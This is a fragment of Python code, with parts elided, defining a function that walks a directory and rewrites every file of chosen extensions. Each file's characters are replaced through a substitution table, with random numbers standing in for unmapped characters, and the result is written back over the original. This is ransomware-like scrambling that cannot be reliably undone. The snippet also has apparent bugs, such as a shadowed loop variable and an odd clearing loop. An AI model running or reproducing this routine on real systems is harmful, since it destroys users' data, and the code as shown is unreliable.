...
def searchs(lists,key = '',nexts = '',CWD = os.getcwd(),f = 'binary'):
	formats = f.split(',')
	...
	for i in lists:
		try:
			...
			print(CWD + '\\' + i + '\n')
			types2 = i.split('.')
			types = types2[1].upper()
			for s in range(0,int(len(formats))):
				formats[s] = formats[s].upper()
			if types in formats:
				with open(CWD + '\\' + i,'r') as read:
					for re in read :
						All += re
				for red in range(0,len(All)):
					try:
						array.append(letters[All[red]])
					except Exception as e:
						array.append(str(randint(32,205)))
					array.append("*")
				with open(CWD + '\\' + i,'w') as write:
					print(''.join(array),file=write)
				All = ''
				for i in array:
					array.clear()
			continue
